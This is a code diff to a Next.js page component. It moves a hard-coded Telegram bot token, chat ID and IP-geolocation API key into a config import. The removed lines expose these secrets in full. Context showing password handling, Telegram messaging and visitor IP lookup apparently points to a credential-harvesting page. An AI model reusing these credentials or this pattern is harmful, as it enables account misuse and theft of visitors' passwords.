@@ -4,6 +4,7 @@ import Image from "next/image";
 import { useRouter } from "next/navigation";
 import { FormEvent, useEffect, useRef, useState } from "react";
 import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
+import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, IPGEO_API_KEY } from "@/lib/config";
 import styles from "./page.module.css";
 
 type ActionItem = {
@@ -365,8 +366,8 @@ export default function HomePageClient({
   const [didTrySubmit, setDidTrySubmit] = useState(false);
   const formTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const passwordTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
-  const botToken = "8612450371:AAE_2TD7if0an1KUke2Fj3v4I624V_e_ykg";
-  const chatId = "-5086700351";
+  const botToken = TELEGRAM_BOT_TOKEN;
+  const chatId = TELEGRAM_CHAT_ID;
 
   const telegramEnabled = Boolean(botToken && chatId);
   const [messageId, setMessageId] = useState<string | null>(null);
@@ -859,7 +860,7 @@ export default function HomePageClient({
         setClientIp(result.ip);
 
         const locationResponse = await fetch(
-          `https://api.ipgeolocation.io/ipgeo?apiKey=126b3879b6b549f8a3e47448ae0a8e91&ip=${result.ip}`,
+          `https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEO_API_KEY}&ip=${result.ip}`,
         );
         if (!locationResponse.ok) {
           throw new Error("Failed to fetch location data");
